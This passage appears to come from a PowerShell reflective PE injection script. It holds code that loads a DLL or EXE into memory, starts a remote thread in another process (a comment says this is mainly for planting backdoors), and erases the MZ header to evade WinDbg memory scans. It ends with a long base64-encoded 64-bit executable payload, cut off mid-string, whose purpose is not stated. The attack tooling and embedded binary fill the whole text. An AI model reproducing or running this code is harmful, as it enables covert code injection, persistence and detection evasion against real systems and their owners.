			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

$executable64 = "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